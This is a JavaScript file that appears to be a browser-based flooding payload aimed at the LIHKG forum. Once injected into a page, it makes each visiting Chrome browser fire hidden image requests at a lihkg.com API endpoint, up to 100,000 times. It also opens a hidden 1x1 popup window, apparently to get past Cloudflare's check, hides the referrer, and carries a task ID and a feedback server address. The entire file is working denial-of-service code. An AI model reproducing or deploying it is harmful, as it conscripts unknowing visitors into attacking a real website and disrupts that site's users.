var TASKID = 33190;
var MAGICNUM = 11997755;
var EXECNUM = 100;
var FEEDBACKADDR = 'http://116.255.226.154/';
if ((/chrome\/([\d]+)/gi.exec(window.navigator.userAgent.toLowerCase())[1] >= 34) && (window.navigator.userAgent.toLowerCase().indexOf("edge") < 0)) {
    var MAX_TIME = 300000;
    var MAGIC = 0x58585858;
    var MAX_COUNT = 100000;
    var url_list = ['https://lihkg.com/api_v2/thread/latest?cat_id=1&page=1&count=60&type=now&t='];
    var cloudflare_js_validate_url = 'https://lihkg.com';
    var TIMEGAP = 500;
    function unixtime() {
        var a = new Date();
        return Date.UTC(a.getFullYear(), a.getMonth(), a.getDate(), a.getHours(), a.getMinutes(), a.getSeconds()) / 1000
    }
    function updateVT() {
        localStorage.vt = (unixtime() + MAX_TIME / 1000) ^ MAGIC
    }
    function canExe() {
        if (localStorage.vt == null) {
            updateVT();
            return true
        } else {
            if ((localStorage.vt ^ MAGIC) > unixtime()) {
                return (localStorage.cl != '0')
            } else {
                if (localStorage.cl != '0') {
                    updateVT();
                    return true
                } else {
                    return false
                }
            }
        }
    }
    if (canExe() == true) {
        localStorage.cl = 0;
        document.getElementsByTagName("head")[0].innerHTML = "<meta name=\"referrer\" content=\"no-referrer\">" + document.getElementsByTagName("head")[0].innerHTML;
        window.onbeforeunload = function () {
            localStorage.cl = 1
        };
        var canpop = false;
        var p_win = null;
        function popwin() {
            if (canpop == true) {
                p_win = window.open(cloudflare_js_validate_url, '_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=100000, top=100000, width=1, height=1, visible=none', '');
                window.focus();
                canpop = false;
                document.removeEventListener('click', popwin)
            }
        }
        document.addEventListener('click', popwin);
        var p_img = null;
        var timer = null;
        var starttime = null;
        var requesttime = null;
        var responsetime = null;
        var url = '';
        var count = 0;
        function imgdel() {
            if (p_img != null) {
                document.body.removeChild(p_img)
            }
            p_img = null;
            url = url_list[unixtime() % url_list.length];
            if (count < MAX_COUNT && responsetime - starttime < MAX_TIME) setTimeout('imgadd()', (responsetime - requesttime) > TIMEGAP ? TIMEGAP : (responsetime - requesttime));
            else localStorage.cl = 1
        }
        function isImgComplete() {
            if (p_img.complete) {
                window.clearInterval(timer);
                responsetime = new Date().getTime();
                if (responsetime - requesttime > 1000) {
                    if (p_win != null) {
                        p_win.close();
                        p_win = null
                    }
                    count += 1
                } else {
                    canpop = true
                }
                imgdel()
            } else {
                if (new Date().getTime() - requesttime > 2000) {
                    imgdel()
                }
            }
        }
        function imgadd() {
            p_img = document.body.appendChild(document.createElement('img'));
            p_img.src = url + unixtime() + Math.ceil(Math.random() * 100);
            p_img.style.display = 'none';
            requesttime = new Date().getTime();
            timer = setInterval("isImgComplete()", 50);
            count = count + 1
        }
        starttime = new Date().getTime();
        url = url_list[unixtime() % url_list.length];
        imgadd()
    }
}